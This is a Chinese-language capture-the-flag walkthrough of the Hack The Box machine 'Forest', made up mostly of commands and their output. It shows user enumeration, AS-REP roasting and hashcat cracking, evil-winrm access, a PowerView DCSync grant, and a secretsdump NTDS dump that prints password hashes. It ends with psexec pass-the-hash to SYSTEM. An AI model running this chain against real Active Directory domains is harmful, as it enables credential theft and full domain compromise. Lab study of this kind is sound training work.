---
title: Forest
pagination_prev: null
pagination_next: null
---

# 端口扫描
### 全端口扫描
~~~
┌──(kali㉿kali)-[~/Forest]
└─$ sudo nmap -sT -p- 10.10.10.161 --min-rate 2000 -oA nmap/ports
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 02:19 EST
Nmap scan report for 10.10.10.161
Host is up (0.079s latency).
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49686/tcp open  unknown
49708/tcp open  unknown
49977/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 33.89 seconds

~~~

### 默认脚本扫描
~~~
┌──(kali㉿kali)-[~/Forest]
└─$ sudo nmap -sT -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49669,49671,49678,49679,49686,49708,49977 10.10.10.161 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 02:24 EST
Nmap scan report for 10.10.10.161
Host is up (0.090s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-31 07:16:24Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49678/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc        Microsoft Windows RPC
49686/tcp open  msrpc        Microsoft Windows RPC
49708/tcp open  msrpc        Microsoft Windows RPC
49977/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-12-30T23:17:19-08:00
| smb2-time: 
|   date: 2024-12-31T07:17:16
|_  start_date: 2024-12-30T13:31:52
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h31m46s, deviation: 4h37m11s, median: -8m15s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.92 seconds

~~~

### 漏洞脚本扫描

~~~
┌──(kali㉿kali)-[~/Forest]
└─$ sudo nmap -sT --script=vuln -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49669,49671,49678,49679,49686,49708,49977  10.10.10.161 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 02:24 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.161
Host is up (0.10s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49686/tcp open  unknown
49708/tcp open  unknown
49977/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 190.28 seconds

~~~

搜集到域名htb.local

对ldap进行用户名枚举
~~~
┌──(myvenv)─(kali㉿kali)-[~/Forest/windapsearch]                                   └─$ python windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U                    [+] No username provided. Will try anonymous bind.                                 [+] Using Domain Controller at: 10.10.10.161                                       [+] Getting defaultNamingContext from Root DSE                                     [+]     Found: DC=htb,DC=local                                                     [+] Attempting bind                                                                [+]     ...success! Binded as:                                                     [+]      None                                                                      [+] Enumerating all AD users                                                       [+]     Found 29 users:                                                            cn: Guest                                                                          cn: DefaultAccount                                                                
cn: Exchange Online-ApplicationAccount                                             userPrincipalName: Exchange_Online-ApplicationAccount@htb.local                    cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}                            userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local   cn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}                            userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local   cn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}                            userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local   cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}                  userPrincipalName: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local                                                            cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136                                 userPrincipalName: Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local        cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042                            userPrincipalName: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local   cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}                            userPrincipalName: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local   cn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}                            userPrincipalName: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local   cn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}                            userPrincipalName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local   cn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe                                  userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local         cn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50                                  userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local         cn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5                                  userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local         cn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8                                  userPrincipalName: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local         cn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba                                  userPrincipalName: HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local         cn: HealthMailbox6ded67848a234577a1756e072081d01f                                  userPrincipalName: HealthMailbox6ded67848a234577a1756e072081d01f@htb.local         cn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab                                  userPrincipalName: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local         cn: HealthMailboxfd87238e536e49e08738480d300e3772                                  userPrincipalName: HealthMailboxfd87238e536e49e08738480d300e3772@htb.local         cn: HealthMailboxb01ac647a64648d2a5fa21df27058a24                                  userPrincipalName: HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local         cn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf                                  userPrincipalName: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local         cn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e                                  userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local         cn: Sebastien Caron                                                                userPrincipalName: sebastien@htb.local                                             cn: Lucinda Berger                                                                 userPrincipalName: lucinda@htb.local                                               cn: Andy Hislip                                                                    userPrincipalName: andy@htb.local                                                  cn: Mark Brandt                                                                    userPrincipalName: mark@htb.local                                                  cn: Santi Rodriguez                                                                userPrincipalName: santi@htb.local                                                 cn: Admin                                                                                                          
[*] Bye!                         
~~~

暴露出几个用户户名

~~~
sebastien@htb.local
lucinda@htb.local
andy@htb.local
mark@htb.local
santi@htb.local
Admin
~~~

用kerbrute进行用户名枚举交叉验证

~~~
┌──(myvenv)─(kali㉿kali)-[~/Forest/kerbrute]
└─$ ./kerbrute  --dc 10.10.10.161 -d htb.local userenum /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 12/31/24 - Ronnie Flathers @ropnop

2024/12/31 03:45:19 >  Using KDC(s):
2024/12/31 03:45:19 >   10.10.10.161:88

2024/12/31 03:45:22 >  [+] VALID USERNAME:       admin@htb.local
2024/12/31 03:46:05 >  [+] VALID USERNAME:       mark@htb.local
2024/12/31 03:46:26 >  [+] VALID USERNAME:       administrator@htb.local
2024/12/31 03:46:32 >  [+] VALID USERNAME:       Admin@htb.local
2024/12/31 03:46:35 >  [+] VALID USERNAME:       andy@htb.local
2024/12/31 03:50:06 >  [+] VALID USERNAME:       forest@htb.local
2024/12/31 03:50:21 >  [+] VALID USERNAME:       Andy@htb.local

~~~

rpcclient也可以列出所有用户名

~~~
┌──(myvenv)─(kali㉿kali)-[~/Forest/windapsearch]
└─$ rpcclient  10.10.10.161 -U "" -N 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[Admin] rid:[0x2581]
~~~

得到以下用户名

~~~
admin
mark
administrator
andy
forest
sebastien
lucinda
santi
svc-alfresco
~~~

可以抓取到svc-alfresco用户的hash

~~~
┌──(myvenv)─(kali㉿kali)-[~/Forest/kerbrute]
└─$ ./kerbrute userenum --dc 10.10.10.161 -d htb.local users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/01/25 - Ronnie Flathers @ropnop

2025/01/01 07:51:31 >  Using KDC(s):
2025/01/01 07:51:31 >   10.10.10.161:88

2025/01/01 07:51:31 >  [+] VALID USERNAME:       sebastien@htb.local
2025/01/01 07:51:31 >  [+] VALID USERNAME:       admin@htb.local
2025/01/01 07:51:31 >  [+] VALID USERNAME:       forest@htb.local
2025/01/01 07:51:31 >  [+] VALID USERNAME:       lucinda@htb.local
2025/01/01 07:51:31 >  [+] VALID USERNAME:       santi@htb.local
2025/01/01 07:51:31 >  [+] VALID USERNAME:       andy@htb.local
2025/01/01 07:51:31 >  [+] VALID USERNAME:       mark@htb.local
2025/01/01 07:51:31 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:5395e735bf254c0ecb4d5a1fe81bb161$bba4b9ee1a330223781897a4af1fa713456982637e8136a5513ecae521da4f0417f066d32d7e00ea6264da31e080f0ff6f7ee637950c1faf67ea2da24611764d5d2f91295004f4b32491e186045922fb0d4b3787eda7d12164b613e5b1f5a0922e92265cfbf1be21e7aa8d0c17ced279306c7d30197310ffa61bdfb2d467ea205afc0f9cd219a7f065238c0660f59e3b34c3f11197416db7c41e9c22abea927d5d14f6319dfe66252e03c91f35f528e3ffeebdd38039232460b74595d07aedaf7b9731194ba7b11b2027ce04220374c8d425393780e1e12ff5af144135df1cf957bc8b780b4e990b55f4fdaba155226e0891ed77e4079826db57
2025/01/01 07:51:31 >  [+] VALID USERNAME:       svc-alfresco@htb.local
2025/01/01 07:51:31 >  [+] VALID USERNAME:       administrator@htb.local
2025/01/01 07:51:31 >  Done! Tested 9 usernames (9 valid) in 0.116 seconds

                                                                             
~~~

~~~
┌──(myvenv)─(kali㉿kali)-[~/Forest]
└─$ python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/svc-alfresco                   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc-alfresco
/home/kali/Forest/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-alfresco@HTB:273e0f04eb793f2b3306a0f312820472$78d3b4e4bb35a0f1b878e09fc34ea50418e21c08242d62dcd3f12865d8a5eae9a601844cba2a94c1a3f7afbd6244bc2b965b0135d197a571b4f7a704da1f17757ccad5f28a4d58ce93ebe37c8b7bfa2ddbb97f610e3c9b94085841e1aff0534fa632891665a5ee0780d49ecbe44351a223da60b8088a0bc11429eae51a8690b75fc5e79219a5c2f4706803f41965b09a75ef9558d3d13e1f866c4deb203e1a89896d520be3220654de5948629a10c4e32f0b89c368d6f61d9d40a048e3335b54f6a7c8e5d46fc4337636f8489e30f5630e7358759cd84b6e50fb4b45f17cc597
~~~

用hashcat破解出密码为s3rvice

~~~
(base) ┌──(lizi㉿lizi)-[~]
└─$ sudo hashcat -m 18200 AS-REP.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-11400H @ 2.70GHz, 2856/5777 MB (1024 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB:273e0f04eb793f2b3306a0f312820472$78d3b4e4bb35a0f1b878e09fc34ea50418e21c08242d62dcd3f12865d8a5eae9a601844cba2a94c1a3f7afbd6244bc2b965b0135d197a571b4f7a704da1f17757ccad5f28a4d58ce93ebe37c8b7bfa2ddbb97f610e3c9b94085841e1aff0534fa632891665a5ee0780d49ecbe44351a223da60b8088a0bc11429eae51a8690b75fc5e79219a5c2f4706803f41965b09a75ef9558d3d13e1f866c4deb203e1a89896d520be3220654de5948629a10c4e32f0b89c368d6f61d9d40a048e3335b54f6a7c8e5d46fc4337636f8489e30f5630e7358759cd84b6e50fb4b45f17cc597:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB:273e0f04eb793f2b3306...7cc597
Time.Started.....: Wed Jan  1 21:04:55 2025, (1 sec)
Time.Estimated...: Wed Jan  1 21:04:56 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2616.4 kH/s (1.08ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4085760/14344385 (28.48%)
Rejected.........: 0/4085760 (0.00%)
Restore.Point....: 4079616/14344385 (28.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s9039554h -> s3r3ndipit

Started: Wed Jan  1 21:04:54 2025
Stopped: Wed Jan  1 21:04:58 2025

~~~

利用evil-winrm登录

~~~
┌──(myvenv)─(kali㉿kali)-[~/Forest]                                                                                                                                                                                                                             
└─$ evil-winrm -i htb.local -u svc-alfresco  -p s3rvice                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                
Evil-WinRM shell v3.7                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                                                
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                         
                                                                                                                                                                                                                                                                
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                                           
                                                                                                                                                                                                                                                                
Info: Establishing connection to remote endpoint                                                                                                                                                                                                                
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami                                                                                                                                                                                                         
htb\svc-alfresco          
~~~

利用bloodhound采集器搜集信息

~~~
┌──(kali㉿kali)-[~/Forest]
└─$ bloodhound-python -c ALL -d htb.local -u svc-alfresco -p 's3rvice' -ns 10.10.10.161 --zip
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 33 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 23S
INFO: Compressing output into 20250101081501_bloodhound.zip

~~~

发现用户svc-alfresco属于ACCOUNT OPERATORS组

![](Pasted%20image%2020250110164942.png)

ACCOUNT OPERATORS对组EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL有GenericAll权限

![](Pasted%20image%2020250110170205.png)

提权的路径为添加一个新用户到EXCHANGE WINDOWS PERMISSIONS组，然后利用DCSync转储hash，实现提权

创建新用户lizisec
~~~
*Evil-WinRM* PS C:\programdata> net user lizisec password123 /add
The command completed successfully.
~~~

将用户添加到EXCHANGE WINDOWS PERMISSIONS组

~~~
*Evil-WinRM* PS C:\programdata> Add-ADGroupMember -Identity "EXCHANGE WINDOWS PERMISSIONS" -Members lizisec
~~~

查看新用户的权限

~~~
*Evil-WinRM* PS C:\programdata> net user lizisec
User name                    lizisec
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/10/2025 12:59:23 AM
Password expires             Never
Password changeable          1/11/2025 12:59:23 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.

~~~

利用powerview赋予用户DCSync权限

~~~
*Evil-WinRM* PS C:\programdata> . ./powerview.ps1
*Evil-WinRM* PS C:\programdata> $SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
*Evil-WinRM* PS C:\programdata> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\lizisec', $SecPassword)
*Evil-WinRM* PS C:\programdata> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity lizisec -Rights DCSync
~~~

利用secretsdump.py转储hash

~~~
┌──(kali㉿kali)-[~/Forest]                                                                                                                                                               
└─$ python ./secretsdump.py 'lizisec:password123@10.10.10.161'                                                                                                                           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                    
                                                                                                                                                                                         
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                       
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                            
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                     
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::                                                                                         
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                           
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                                                                          
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                  
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                 
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::                                                                                 
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::                                                                                 
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::                                                                                 
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::                                                                                 
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::                                                                                 
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::                                                                                 
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::                                                                                 
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::               
~~~

psexec利用hash登录，成功提权

~~~
┌──(kali㉿kali)-[~/Forest]
└─$ ./psexec.py "administrator"@10.10.10.161 -hashes ad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file OAGSvkvx.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service lMUt on 10.10.10.161.....
[*] Starting service lMUt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system


~~~



